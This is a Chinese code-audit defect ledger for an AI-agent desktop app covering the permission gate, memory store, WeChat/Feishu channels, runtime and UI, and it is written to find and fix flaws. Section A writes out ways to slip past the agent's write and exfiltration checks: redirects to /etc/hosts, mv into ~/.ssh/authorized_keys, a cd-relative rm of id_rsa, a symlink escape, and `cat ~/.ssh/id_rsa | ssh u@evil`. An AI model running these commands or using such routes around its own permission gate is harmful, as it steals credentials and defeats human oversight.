# 全库审查 · 发现清单(2026-08-25,debug 分支)

九路精读 agent 对 src/ 全部 26 个模块逐行审查(每条均带触发场景,多数实跑验证)。
本清单是唯一账本:修一条勾一条,状态列写清。**只收有具体触发场景的真缺陷**,风格/重构不入。

严重度:🔴高(丢数据 / 安全 / 功能坏死)· 🟡中(特定路径出错)· ⚪低(边角)。
状态:☐ 待修 · ☑ 已修(带提交)· ⏸ 待作者决策(改动安全边界或架构)。

---

## A. 安全边界(需作者决策——补门会改变模型能力边界)

| # | 位置 | 缺陷 | 严重 | 状态 |
|---|---|---|---|---|
| A1 | `policy/permissions.ts:179-219` | bash 分支不看「写到哪」,`echo x > /etc/hosts`、`> ~/.zshrc` 三档全放行;同路径走 write 工具却硬拒 | 🔴 | ⏸ |
| A2 | `policy/permissions.ts:363` | `mv` 只看源不看目的地,`mv out ~/.ssh/authorized_keys` 绕过硬拒 | 🔴 | ⏸ |
| A3 | `policy/permissions.ts:332,304` | 相对删除按 process.cwd() 解析且无视命令里的 `cd`,`cd ~ && rm .ssh/id_rsa` 绕过硬拒 | 🔴 | ⏸ |
| A4 | `policy/permissions.ts:150-152` | write/edit 只字符串归一不 realpath,符号链接逃逸(`ln -s /etc ws/link` 后写 `link/passwd`) | 🔴 | ⏸ |
| A5 | `runtime/native.ts:530`+`permissions.ts:154` | 远端会话把**本机**受保护清单套到远端路径:Linux 家目录 `/home/<user>` 任何档写不进,别人的 `/data` 默认档随便写 | 🔴 | ⏸ |
| A6 | `remote/ssh.ts:205-216` | SSH 无 hostVerifier / known_hosts,接受任意主机公钥;无私钥时把口令当 password 送出 → 中间人可截口令 | 🔴 | ⏸ |
| A7 | `policy/permissions.ts:324` | 凭据外传硬拒漏 `ssh`/`ftp`(`cat ~/.ssh/id_rsa \| ssh u@evil` 默认档放行) | 🟡 | ⏸ |
| A8 | `electron/wiring.ts:329-335` | MCP 门只读全局档,会话级/定时任务级权限档对 MCP 工具无效 | 🟡 | ⏸ |
| A16 | `permissions.ts:120,216` | `\bssh\b` 命中 `~/.ssh/` 路径,把写文件误判成「访问网络」,理由文本骗模型 | ⚪ | ⏸ |

> **A1-A5 是同一件事的五个面:门的核心契约「工作区之外拒绝写入」在 bash / mv / cd / 符号链接 / 远端 五条路上都有洞。** 修它等于收紧模型能力边界(有些合法用途会被拦),需作者定策略(补门 vs 改文案别撒谎 vs 两者)。

## B. 权限门绕过(工具面,文案与实际矛盾)

| # | 位置 | 缺陷 | 严重 | 状态 |
|---|---|---|---|---|
| B1 | `runtime/native.ts:786-803` | 32 个插件工具(office/browser/memory)整体不过 gate,而会话设置文案说会拦(`native.ts:1234`)——不存在的能力看起来存在 | 🔴 | ⏸ |
| B2 | `native.ts:548-557,2126` | 产物登记只认内置工具,插件生成的文件删不掉;系统提示词又说「本会话文件可清」 | 🟡 | ⏸ |

## C. 记忆域

| # | 位置 | 缺陷 | 严重 | 状态 |
|---|---|---|---|---|
| C1 | `memory/store.ts:280` | 去重按正文比,不同分支同句误判重复,采纳报成功却没写,dev 记忆永久丢 | 🔴 | ☑ 5c… |
| C2 | `memory/store.ts:269` | add 缺 § 校验,含 § 的内容被劈两条,后半丢戳与作用域 | 🟡 | ☑ |
| C3 | `memory/store.ts:83` | 盖戳剥日期正则 `[^\]]*` 吃掉 `[2024-03-05 组会]` 的「组会」,静默丢内容 | 🟡 | ☑ |
| C4 | `memory/store.ts:85,59` | 正文以 `[branch:]` 开头劫持作用域;显式 branches 被正文覆盖 | 🟡 | ☑ |
| C14 | `memory/store.ts:83` | 盖戳不剥正文冒充的 `[id:]`,身份证泄进模型上下文 | ⚪ | ☑ |
| C5 | `memory/queue.ts:75` | 建议去重「互相包含」,更丰富的新建议被短建议吞掉 | 🟡 | ☐ |
| C6 | `memory/queue.ts:34` | SUGGESTIONS.jsonl 一行坏 JSON → readAll 抛 → 整个建议队列 + memory_propose 全不可用 | 🟡 | ☐ |
| C7 | `memory/store.ts:262` | add 号称 append-only 免 drift,实为整文件重写,抹平漂移信号让 .bak 永不出现 | 🟡 | ☐ |
| C8 | `memory/store.ts:131` | 锁 pid 探活优先于 mtime,pid 复用后锁永久有效,记忆写入永久失败;EPERM 被当「已死」抢活锁 | 🟡 | ☐ |
| Cx | `backend.ts:2240` | memoryResolve「归档」两步非原子:archive 因前 40 字撞多条失败 → 条目留主轨会注入,建议还放回队列 | 🟡 | ☐ |
| C9 | `store.ts:372,398` | 归档轨无 drift guard,手工整理过的归档文件被重排丢空白 | ⚪ | ☐ |
| C10 | `tools/memory/index.ts:99` | limit 传非数字 → slice(0,NaN) 空数组,却报「共 N 条」,模型以为记忆空 | ⚪ | ☐ |
| C11 | `pending-skills.ts:107` | renameSync 撞非空同名目录抛 ENOTEMPTY 未捕获;EXDEV 分支 cpSync 静默合并覆盖 | ⚪ | ☐ |
| C12 | `pending-skills.ts:24` | frontmatter 逐行正则把 YAML 块标量 `\|`/`>` 解析成字面量,描述丢失 | ⚪ | ☐ |
| C13 | `store.ts:176` | 清 stale 锁存在「删别人刚拿的锁」窄窗口 | ⚪ | ☐ |

## D. IM 通道(微信/飞书)

| # | 位置 | 缺陷 | 严重 | 状态 |
|---|---|---|---|---|
| D1 | `weixin/ilink.ts:371,350` | CDN 上传/下载无超时,一张图挂住整条入站轮询永久停摆(已复现) | 🔴 | ☐ |
| D2 | `weixin/channel.ts:553`+`feishu:475` | 待答写在「权限通知关」判断之前 → 关掉权限通知=静默自动放行,随口「好」批准没见过的询问(已复现) | 🔴 | ☐ |
| D3 | `weixin/channel.ts:192` | startLogin 的 `if(this.login)return` 守卫在 await 后才赋值 → 双份扫码流,cancel 只关一个,孤儿循环仍写 token(已复现) | 🔴 | ☐ |
| D4 | `weixin:293`+`feishu:230` | unbind 不取消进行中扫码 → 解绑后手机确认把凭证写回来(已复现,两侧) | 🔴 | ☐ |
| D5 | `weixin:299`+`feishu:234` | unbind 不清 `*.sessionId`、不 unpin → 换人绑定后新人落进前一人的私密会话(已复现) | 🔴 | ☐ |
| D8 | `feishu/sdk.ts:91` | real SDK 的 reactionIds Map 跨 `sdk()` 实例失效 → 线上 OnIt 一次都撤不掉;且每条消息重换 token(fake 验不出) | 🟡 | ☐ |
| D6 | `feishu/channel.ts:137` | 处理中消息单槽,两条在飞时第一条 OnIt 撤不掉、第二条被提前 DONE(已复现) | 🟡 | ☐ |
| D7 | `feishu/channel.ts:310` | 斜杠/权限分支忘复位 处理中消息 → 同条消息被打两次 DONE(已复现) | 🟡 | ☐ |
| D9 | `weixin/channel.ts:244` | binded_redirect 分支清 stale 却不 start() → 界面显示已连、实际聋着(已复现) | 🟡 | ☐ |
| D10 | `feishu/channel.ts:303` | 去重记在处理之前且不可撤,一次瞬时失败=消息永久丢(at-most-once) | 🟡 | ☐ |
| D11 | `weixin/ilink.ts:281` | sendItem 只看 ret 不看 errcode,发送失败(含 -14)被当成功吞掉 | 🟡 | ☐ |
| D12 | `feishu/channel.ts:294` | 非 text/非 p2p 在去重前就回信 → WS 重投重复回复(已复现) | 🟡 | ☐ |
| D13 | `weixin/ilink.ts:503`+`feishu:105` | 切段在 UTF-16 边界劈开 emoji 代理对,发出非法码点 | ⚪ | ☐ |
| D14 | `feishu/channel.ts:110` | 切段9000 会吐 1 个字的独立消息(与微信口径不一致) | ⚪ | ☐ |
| D15 | `feishu/sdk.ts:163` | closed 回调无 stopped 守卫,迟到的 closed 盖掉新连接 ready(fake 验不出) | ⚪ | ☐ |
| D16 | `weixin/channel.ts:393` | 图片下载失败时同条消息的文字也被一起丢 | ⚪ | ☐ |
| D17 | `weixin/channel.ts:143` | 报过的工具/输入票 从不清理,Set 只增;换账号后用旧 typing 票 | ⚪ | ☐ |

## E. 工具与原生运行时

| # | 位置 | 缺陷 | 严重 | 状态 |
|---|---|---|---|---|
| E1 | `tools/office/pdf.ts:93` | pdf_create 写盘在 emitter 回调里、不在 try 内 → 目录不存在时 uncaughtException(主进程崩)且 Promise 永挂 | 🔴 | ☐ |
| E2 | `tools/browser/tools.ts:318` | browser_download 的 save_as 目录穿越(`../../x` 写到工作区外),不过门也不用 resolveInWorkspace | 🔴 | ☐ |
| E4 | `native.ts:1171` | start() 无重入保护,重复 start 同 sessionId 丢旧会话不 dispose,事件翻倍、账本重复计数 | 🟡 | ☐ |
| E5 | `native.ts:894,2075` | stop() 在 start() 完成前调用漏掉整段会话,pi session 不 dispose、订阅常驻 | 🟡 | ☐ |
| E6 | `browser/session.ts:58` | 共享浏览器单全局活跃标签,两段会话互相把页面开走;B 的截图/下载落进 B 工作区却是 A 的页面(跨工作区越界) | 🟡 | ⏸ |
| E7 | `office/index.ts:74`+`ppt.ts:366` | pptx slides[].image 路径不按工作区解析,模型给对相对路径也读不到 | 🟡 | ☐ |
| E9 | `browser/tools.ts:19` | 清截图删掉人放进 .dawn/screenshots/ 的 png(注释与测试给的是相反保证) | ⚪ | ☐ |
| E10 | `browser/session.ts:58` | goto 失败留空白页当活跃标签;download 对 `/` 结尾 URL 名字兜底失效 → EISDIR | ⚪ | ☐ |

## F. workbench / 协议

| # | 位置 | 缺陷 | 严重 | 状态 |
|---|---|---|---|---|
| F1 | `electron/credentials.ts:124` | configured() 前缀过滤漏 feishu/vision/mcp → 设置屏能一键误删飞书密钥、MCP 密钥、视觉 key | 🔴 | ☐ |
| F2 | `protocol/operations.ts:376` | subscribeSession 标 mutating:false 却拉起进程 + SSH 连接,readOnly 挡不住;testMcpServer/getEnvironment/openExternally 同类 | 🟡 | ☐ |
| F3 | `workbench/events.ts:660` | 服务端 splice 一条 item 但协议无「删除」支,实时流里「你出现了两次」仍复现 | 🟡 | ☐ |
| F5 | `store/tasks.ts:74`+通道 | 归档一段会话静默切断微信/飞书绑定,下条消息落进新建会话,上下文断且无提示 | 🟡 | ☐ |
| F6 | `backend.ts:2562` | writeToSession 把所有异常压成 conflict,同状态 subscribeSession 报 not_found——两个码 | 🟡 | ☐ |
| F7 | `server.ts:113…` | retryable 恒 false,协议为它写的纪律没实现 | ⚪ | ☐ |
| F8 | `backend.ts:2457,959` | connectRemote 把「密码错」报成 internal_error(该是 invalid_request) | ⚪ | ☐ |
| F9 | `operations.ts:100` | 分页 after 游标被忽略,永远回第一页 | ⚪ | ☐ |
| F10 | `backend.ts:590` | 传输记录永不回收 | ⚪ | ☐ |
| F12 | `events.ts:209` | dispose 漏收 pinned 与 全听 集合(微信/飞书 onAnyUpdate 回调留着) | ⚪ | ☐ |
| F13 | `backend.ts:1117` | 删会话/删项目在 tasks 未装配时留半完成态 | ⚪ | ☐ |

## G. electron / 存储 / 配置

| # | 位置 | 缺陷 | 严重 | 状态 |
|---|---|---|---|---|
| G1 | `electron/main.ts:222` | ipcMain.handle 写在 createWindow 内,macOS 关窗再点 Dock 必抛「second handler」,新窗口留白且丢导航守卫 | 🔴 | ☐ |
| G4 | `config/mcp-writer.ts:191` | removeMcpServer 正则转义写坏(replace 空操作),删带点名字会删错服务器 | 🟡 | ☐ |
| G2 | `electron/wiring.ts:1093` | close() 里 db.close() 跑在会话收摊前,exited 写库抛「database not open」;attach 回调抛→主进程未捕获异常 | 🟡 | ☐ |
| G5 | `electron/web-preview.ts:287` | will-download 挂共享 persist Session,视图重建多一份监听→一次下载记多条 Run(G1 修好才可达) | 🟡 | ☐ |
| G6 | `wiring.ts:336` | mcp.trusted.<名> 按名字走且比服务器活得久,删掉再由 clone 的 .dawn/mcp.yaml 同名进来直接继承信任 | 🟡 | ☐ |
| G7 | `electron/main.ts:452` | DAWN_MODELS_JSON 顺手开 skipCredentialGate,生产用它覆盖端点时凭证守卫消失 | ⚪ | ☐ |

## H. 内核 / ACP / 团队 / 子 agent

| # | 位置 | 缺陷 | 严重 | 状态 |
|---|---|---|---|---|
| H1 | `kernel/挂载.ts:223,140` | 对话内核从不回收(收() 零调用,不进 SessionManager),run_code 用过后退出不关 zeromq→SIGABRT 回归 + 端口泄漏 | 🔴 | ⏸ |
| H2 | `runtime/kernel.ts:112` | KernelRuntime 无进程死亡探测,内核被 OOM 杀掉后 run_code 的 promise 永挂 | 🔴 | ☐ |
| H3 | `runtime/cli/claude.ts:117` | ClaudeDriver.close() 不 settle 在等的那轮 → 中止一次永久卡住(inFlight 不减、setModel 永抛、账本永远 running) | 🔴 | ☐ |
| H4 | `kernel/挂载.ts:114`+`acp/kernel.ts:119` | 内核懒起 TOCTOU,并发同语言泄漏一整台内核 | 🟡 | ☐ |
| H5 | `runtime/acp/launch.ts:149` | ACP 借出终端只 SIGTERM 不升级 SIGKILL,`trap '' TERM` 命令让 stop() 永久挂 | 🟡 | ☐ |
| H6 | `subagent/executor.ts:252`+`team/runner.ts:50` | 子 agent/成员 kill 只杀直接子进程,孙进程(npm test/python)成孤儿烧资源 | 🟡 | ☐ |
| H7 | `subagent/executor.ts:238` | 子 agent 无墙钟超时,模型 API 挂住则工具调用无限挂(team 有 30 分钟,子 agent 漏) | 🟡 | ☐ |
| H8 | `kernel/channel.ts:598` | 内核 stdout 是 pipe 但无人读,绕过 ipykernel 直写 fd1 累积 >64KB 内核死锁 | 🟡 | ☐ |
| H9 | `runtime/acp/runtime.ts:385` | ACP start() 失败留活着的适配器进程(每点一次新建会话多一棵进程树) | ⚪ | ☐ |
| H10 | `acp/gateway.ts:102` | 网关 socket 文件永不删(关掉() 零调用) | ⚪ | ☐ |
| H11 | `runtime/pty.ts:118` | PtyRuntime 的 sinks 永不清 | ⚪ | ☐ |
| H12 | `team/scheduler.ts:100` | `void 踢一下` 无 catch,会话目录被外部删时炸成 unhandledRejection | ⚪ | ☐ |

## I. UI 主干与状态

| # | 位置 | 缺陷 | 严重 | 状态 |
|---|---|---|---|---|
| I1 | `App.tsx:276`+`connection.ts:80` | 连接失败进 reconnecting 死胡同:无自动重试定时器,exhausted 全屏(唯一有重试按钮的)不可达→永远转圈点不动 | 🔴 | ☐ |
| I2 | `App.tsx:907,2680` | readFile 无过期守卫,先点大文件后点小文件→大文件后回覆盖内容而文件名是小文件的 | 🟡 | ☐ |
| I3 | `state/sync.ts` loadRuns/loadContextUsage | 账本管子无守卫,快点两会话→A 的账本渗进 B | 🟡 | ☐ |
| I4 | `App.tsx:755,811` | 变量/环境面板无守卫,同上 | 🟡 | ☐ |
| I5 | `App.tsx:1431` | switchProblem 跨会话残留,A 换模型失败的 ⚠ 挂到 B 的输入框 | 🟡 | ☐ |
| I6 | `App.tsx:372`+`palette.tsx:47` | Ctrl+P/Ctrl+K 从终端手里被抢(xterm 无 stopPropagation),shell 收到 ^P/^K 同时右坞/命令面板弹出且抢焦点 | 🟡 | ☐ |
| I7 | `commands.ts:245,121`+`App.tsx:1583,1588` | i18n 漏 t():命令标题、删会话确认标题/按钮英文界面出汉字 | 🟡 | ☐ |
| I8 | `App.tsx:4292` | 文件两栏判据用存的宽度非实际宽度,窗口变窄后仍按 720 铺开两栏(无 resize 监听) | ⚪ | ☐ |
| I9-15 | 见报告 | actions memo 缺依赖、carryDraft 死代码、resetAllState 漏清、未读只增不减、传输态不随面板清、异常退出订阅欠账 | ⚪ | ☐ |

## J. UI 组件群

| # | 位置 | 缺陷 | 严重 | 状态 |
|---|---|---|---|---|
| J1 | `Settings.tsx:311` | 主题色输入框打不进 HEX:任何 Shift 按下翻转格式并清草稿,`#`与大写字母都触发 | 🔴 | ☐ |
| J2 | `review.tsx:152` | loadDiff 无 catch,取不到 diff 永久转圈 + unhandled rejection | 🔴 | ☐ |
| J3 | `attach-panel.tsx:29` | 错误设了但 `if(!用量)return null` 在前→attachUsage reject 时整块消失 | 🔴 | ☐ |
| J6 | `views.tsx:6246,5954` | 空态换 agent/点开场卡,排队的图和文件被静默丢弃 | 🔴 | ☐ |
| J4 | `Settings.tsx:326` | 主题色复制失败只进 console(files.tsx 同动作要求出声) | 🟡 | ☐ |
| J5 | `remote-assistant.tsx:196/370` | 微信卡飞书卡同屏八个勾选框四对文案一字不差,无区分 aria(违反「两处一样=没判据」) | 🟡 | ☐ |
| J7 | `remote-assistant.tsx:262` | 飞书轮询成功不清错,瞬时抖动后红字永久留 | 🟡 | ☐ |
| J8 | `remote-assistant.tsx:209/383` | 通知开关乐观翻转失败不回滚,屏显开后端关 | 🟡 | ☐ |
| J9 | `remote-assistant.tsx:61` | loadNotify 错被吞,通知区永停「正在问状态」 | 🟡 | ☐ |
| J10 | `web.tsx:308` | 地址栏 `value={草稿\|\|状态.url}` 清光又长回来,没法清空重打 | 🟡 | ☐ |
| J11 | `memory-panel.tsx:262` | slice(0,60) 定位死胡同:两条前 60 字相同/一条是另一条子串时,短的永远删不掉,屏上只给做不到的指令 | 🟡 | ☐ |
| J12 | `skills.tsx:1096` | 删 MCP 服务器无确认(删技能/子 agent 都有) | 🟡 | ☐ |
| J13 | `remote-assistant.tsx:172/351` | 解绑微信/飞书无确认(有现成 ConfirmDialog) | 🟡 | ☐ |
| J14 | `schedule.tsx:442` | skipped/queued 行无 sessionId 却是按钮态,点了什么都不发生 | 🟡 | ☐ |
| J15 | `Settings.tsx:409,426`+`agent-browser.tsx:102`+`turn-navigator.tsx:92` | 裸 `<button>` 换行绕过设计契约扫描,含唯一说明是 `title=` | 🟡 | ☐ |
| J16 | `views.tsx:4354` | 附件令牌用 String.replace 首次命中,撞工作区同名引用;`$&` 等替换模式被展开 | 🟡 | ☐ |
| J17 | `terminal.tsx:127` | xterm 首次 import 窗口内到达的输出不写入,秒结束命令终端空白 | 🟡 | ☐ |
| Ji18n | views/panels/Settings 多处 | 英文模式下屏上直接出汉字(t() 漏调,见报告清单) | 🟡 | ☐ |
| J-低 | 见报告 | file:// 的 # 未转义、enhance cancel 吞错、补预览无 catch、attach 自绘确认绕开 ConfirmDialog | ⚪ | ☐ |

---

## 修复进度(2026-08-25,debug 分支)

**已修 + 配回归测试(约 32 条,按提交):**
- `01f54fe` 记忆盖戳/去重五处数据丢失(C1-C4/C14)
- `bfc24fa` 凭据误删(F1)/CLI 中止卡死(H3)/pdf_create 崩进程(E1)/browser 下载目录穿越(E2/E10)
- `8d3ea14` IM 三安全:关权限通知=静默放行(D2)/解绑不取消扫码(D4)/解绑串会话(D5),微信飞书两侧
- `344b3a5` **安全门补齐(作者选 A)**:bash 写文件(A1)/mv 目的地(A2)/cd 相对删除(A3)/符号链接逃逸(A4)/远端路径语义(A5)/凭据外传补 ssh-ftp(A7)
- `5a75469` 插件工具过门(B1)
- `f96b7a2` 对话内核退出回收(H1)
- `46ec926` UI 错误处理:review 转圈(J2)/attach 消失(J3)/飞书轮询不清错(J7)/通知不回滚(J8)/地址栏(J10)
- `25e96f0` 连接死胡同(I1)
- `b072426` IM 续:CDN 无超时挂死轮询(D1)/sendItem 漏 errcode(D11)/binded_redirect 不重启(D9)/非 text 去重前回信(D12)/立即回复占单槽(D7)
- `3fb3a59` 记忆续:坏 JSON 炸队列(C6)/去重吞更丰富建议(C5)/锁 pid 复用永久失败(C8)
- `49245eb` UI 续:主题色打不进 HEX(J1)/记忆条目子串删不掉(J11)

**累计约 46 条已修配回归测试。** 全部高危(安全/崩溃/数据丢失)+ 关键中危(IM 安全与挂死、UI 死循环/死胡同、用户高频撞到的交互)已修完。

**待作者决策:** A6(SSH 主机公钥校验/TOFU)——需要定信任模型(首次自动信任 vs 需确认、中间人变化怎么提示),宜单独走 spec,不塞在 debug 批里。

**剩余中低危(在上表 ☐,按域可续)**:资源泄漏(H2/H4-H12、F10/F12)、会话切换竞态(I2-I5)、UI 边角(J1/J4/J5/J11-J17)、i18n 漏 t()、IM 中低危(D1/D6-D17)、记忆中低危(C5-C13)、workbench(F3-F13)。这些多为「长时运行才显现 / 特定快速操作才触发 / 只影响英文界面 / 边角」,不影响核心功能与安全,可分批续修。

## 修复批次建议

- **批 1(已开工):记忆 store 数据丢失** C1-C4/C14 ✅。续:C5/C6/C7/C8 + backend 归档非原子。
- **批 2:凭据与崩溃** F1(误删密钥)、G1(Dock 重开崩)、E1(pdf 崩进程)、J2/J3/J6(UI 死循环/丢数据)——都是面积小的实锤。
- **批 3:IM 通道** D2/D3/D4/D5(权限静默放行、解绑失效、串会话)+ D1(图片挂死)——刚接的飞书/微信,修完配 e2e。
- **批 4:资源泄漏** H1/H2/H3(内核回收、CLI 卡死)+ H4-H8。
- **批 5(需作者决策):安全边界** A1-A6、B1-B2、E6、H1 架构——补门 vs 改文案,请作者定策略。
- **批 6:UI 竞态与 i18n** I2-I7、J 系列。
